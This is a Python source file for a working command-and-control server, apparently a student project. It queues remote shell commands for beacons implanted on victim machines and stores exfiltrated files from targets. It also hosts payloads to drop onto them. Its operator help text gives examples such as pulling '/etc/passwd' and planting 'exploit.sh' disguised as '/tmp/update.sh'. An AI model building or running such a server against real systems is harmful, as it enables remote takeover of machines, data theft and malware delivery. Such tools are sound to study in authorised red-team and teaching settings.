#!/usr/bin/env python3
"""
Enhanced C2 Server for HTTP Beacon
Author: Arshia Aggarwal aa9779@rit.edu

Enhanced features:
- Proper command queuing and result tracking
- File upload receiving (exfiltration storage)
- File download serving (payload hosting)
- Beacon tracking with system info
- Interactive operator interface
"""

from flask import Flask, request, jsonify, send_file
import datetime
import threading
import sys
import os
import base64
import json

app = Flask(__name__)

# Data structures
pending_commands = {}      # {beacon_id: command_dict}
command_results = []       # List of {beacon_id, timestamp, output}
active_beacons = {}        # {beacon_id: {last_seen, sys_info}}
uploaded_files = {}        # {filename: file_data}
hosted_files = {}          # {filename: file_data} - files to download to beacons

# Directory for storing exfiltrated files
EXFIL_DIR = "./exfiltrated_files"
PAYLOADS_DIR = "./payloads"

# Create directories if they don't exist
os.makedirs(EXFIL_DIR, exist_ok=True)
os.makedirs(PAYLOADS_DIR, exist_ok=True)

@app.route('/checkin/<beacon_id>', methods=['POST'])
def checkin(beacon_id):
    """Beacon checks in with system info - send any pending commands"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Get system info from beacon
    sys_info = request.get_json() or {}
    
    # Track active beacon
    active_beacons[beacon_id] = {
        'last_seen': timestamp,
        'sys_info': sys_info
    }
    
    print(f"[{timestamp}] Beacon {beacon_id} checked in")
    if sys_info:
        print(f"             Platform: {sys_info.get('platform', 'unknown')}, "
              f"User: {sys_info.get('user', 'unknown')}, "
              f"CWD: {sys_info.get('cwd', 'unknown')}")
    
    # Do we have a command for this beacon?
    if beacon_id in pending_commands:
        cmd = pending_commands[beacon_id]
        del pending_commands[beacon_id]  # Remove after sending
        print(f"[{timestamp}] Sending command to {beacon_id}: {cmd}")
        return jsonify(cmd)
    else:
        # No command, tell beacon to wait
        return jsonify({'command': None})

@app.route('/results/<beacon_id>', methods=['POST'])
def results(beacon_id):
    """Beacon sends back command results"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = request.get_json()
    output = data.get('output', '')
    
    print(f"\n{'='*60}")
    print(f"[{timestamp}] Results from {beacon_id}:")
    print('='*60)
    print(output)
    print('='*60 + "\n")
    
    # Store results
    command_results.append({
        'beacon_id': beacon_id,
        'timestamp': timestamp,
        'output': output
    })
    
    return jsonify({'status': 'received'})

@app.route('/upload/<beacon_id>', methods=['POST'])
def upload_file(beacon_id):
    """Receive file upload from beacon (exfiltration)"""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        data = request.get_json()
        filename = data.get('filename')
        filepath = data.get('filepath')
        file_data = base64.b64decode(data.get('data'))
        
        # Save to exfiltrated files directory
        safe_filename = f"{beacon_id}_{filename}"
        save_path = os.path.join(EXFIL_DIR, safe_filename)
        
        with open(save_path, 'wb') as f:
            f.write(file_data)
        
        print(f"\n[{timestamp}] File uploaded from {beacon_id}")
        print(f"             Original: {filepath}")
        print(f"             Saved as: {save_path}")
        print(f"             Size: {len(file_data)} bytes\n")
        
        return jsonify({'status': 'success', 'saved_as': safe_filename})
        
    except Exception as e:
        print(f"[ERROR] File upload failed: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    """Serve file to beacon for download (payload drop)"""
    try:
        filepath = os.path.join(PAYLOADS_DIR, filename)
        
        if not os.path.exists(filepath):
            return jsonify({'error': 'File not found'}), 404
        
        # Read file and encode
        with open(filepath, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({
            'filename': filename,
            'data': file_data,
            'size': os.path.getsize(filepath)
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def operator_interface():
    """Run operator command interface in separate thread"""
    print("\n" + "="*60)
    print("=== C2 Operator Interface ===")
    print("="*60)
    print("\nCommands:")
    print("  shell <beacon_id> <command>      - Execute shell command")
    print("  upload <beacon_id> <filepath>    - Exfiltrate file from target")
    print("  download <beacon_id> <file> <dest> - Drop payload on target")
    print("  sysinfo <beacon_id>              - Get detailed system info")
    print("  list                             - List active beacons")
    print("  beacons                          - Show beacon details")
    print("  results [count]                  - Show recent results")
    print("  files                            - List exfiltrated files")
    print("  payloads                         - List available payloads")
    print("  exit                             - Shutdown C2 server")
    print("\nExamples:")
    print("  shell beacon-victim whoami")
    print("  upload beacon-victim /etc/passwd")
    print("  download beacon-victim exploit.sh /tmp/update.sh")
    print("="*60 + "\n")
    
    while True:
        try:
            user_input = input("C2> ").strip()
            
            if not user_input:
                continue
                
            parts = user_input.split(' ', 3)
            command = parts[0].lower()
            
            if command == 'shell' and len(parts) >= 3:
                beacon_id = parts[1]
                shell_cmd = ' '.join(parts[2:])
                pending_commands[beacon_id] = {
                    'command': shell_cmd,
                    'type': 'shell'
                }
                print(f"[+] Queued shell command for {beacon_id}: {shell_cmd}\n")
                
            elif command == 'upload' and len(parts) >= 3:
                beacon_id = parts[1]
                filepath = parts[2]
                pending_commands[beacon_id] = {
                    'command': 'upload',
                    'type': 'upload',
                    'filepath': filepath
                }
                print(f"[+] Queued file upload for {beacon_id}: {filepath}\n")
                
            elif command == 'download' and len(parts) >= 3:
                beacon_id = parts[1]
                filename = parts[2]
                destination = parts[3] if len(parts) >= 4 else f'/tmp/{filename}'
                
                # Check if payload exists
                payload_path = os.path.join(PAYLOADS_DIR, filename)
                if not os.path.exists(payload_path):
                    print(f"[!] Payload not found: {filename}")
                    print(f"[!] Place files in {PAYLOADS_DIR}/ directory\n")
                    continue
                
                pending_commands[beacon_id] = {
                    'command': 'download',
                    'type': 'download',
                    'filename': filename,
                    'destination': destination
                }
                print(f"[+] Queued file download for {beacon_id}: {filename} -> {destination}\n")
                
            elif command == 'sysinfo' and len(parts) >= 2:
                beacon_id = parts[1]
                pending_commands[beacon_id] = {
                    'command': 'sysinfo',
                    'type': 'sysinfo'
                }
                print(f"[+] Queued sysinfo request for {beacon_id}\n")
                
            elif command == 'list':
                print(f"\n[*] Active beacons ({len(active_beacons)}):")
                if active_beacons:
                    for bid, info in active_beacons.items():
                        sys_info = info.get('sys_info', {})
                        print(f"  - {bid}")
                        print(f"    Last seen: {info['last_seen']}")
                        print(f"    Platform: {sys_info.get('platform', 'unknown')}")
                        print(f"    User: {sys_info.get('user', 'unknown')}")
                else:
                    print("  No active beacons")
                print()
                
            elif command == 'beacons':
                print(f"\n[*] Beacon Details:")
                if active_beacons:
                    for bid, info in active_beacons.items():
                        sys_info = info.get('sys_info', {})
                        print(f"\n{bid}:")
                        print(json.dumps(sys_info, indent=2))
                else:
                    print("  No active beacons")
                print()
                
            elif command == 'results':
                count = int(parts[1]) if len(parts) >= 2 else 5
                print(f"\n[*] Recent results (showing last {count}):")
                if command_results:
                    for result in command_results[-count:]:
                        print(f"\n[{result['timestamp']}] {result['beacon_id']}:")
                        print("-" * 50)
                        output = result['output']
                        if len(output) > 1000:
                            print(output[:1000] + "\n... (truncated)")
                        else:
                            print(output)
                else:
                    print("  No results yet")
                print()
                
            elif command == 'files':
                print(f"\n[*] Exfiltrated files in {EXFIL_DIR}:")
                files = os.listdir(EXFIL_DIR)
                if files:
                    for f in files:
                        filepath = os.path.join(EXFIL_DIR, f)
                        size = os.path.getsize(filepath)
                        print(f"  - {f} ({size} bytes)")
                else:
                    print("  No exfiltrated files yet")
                print()
                
            elif command == 'payloads':
                print(f"\n[*] Available payloads in {PAYLOADS_DIR}:")
                files = os.listdir(PAYLOADS_DIR)
                if files:
                    for f in files:
                        filepath = os.path.join(PAYLOADS_DIR, f)
                        size = os.path.getsize(filepath)
                        print(f"  - {f} ({size} bytes)")
                else:
                    print(f"  No payloads. Place files in {PAYLOADS_DIR}/ to host them")
                print()
                
            elif command in ['exit', 'quit']:
                print("[*] Shutting down C2 server...")
                os._exit(0)
                
            else:
                print("[!] Unknown command or invalid syntax")
                print("[!] Type a command from the list above\n")
                
        except KeyboardInterrupt:
            print("\n[*] Shutting down C2 server...")
            os._exit(0)
        except Exception as e:
            print(f"[ERROR] {str(e)}\n")

if __name__ == '__main__':
    print("\n" + "="*60)
    print("Starting Enhanced HTTP Beacon C2 Server")
    print("="*60)
    print(f"Listening on: http://0.0.0.0:8080")
    print(f"Exfiltrated files: {EXFIL_DIR}/")
    print(f"Payloads directory: {PAYLOADS_DIR}/")
    print("="*60)
    
    # Start operator interface in separate thread
    interface_thread = threading.Thread(target=operator_interface, daemon=True)
    interface_thread.start()
    
    # Run Flask server (debug=False for cleaner output)
    app.run(host='0.0.0.0', port=8080, debug=False)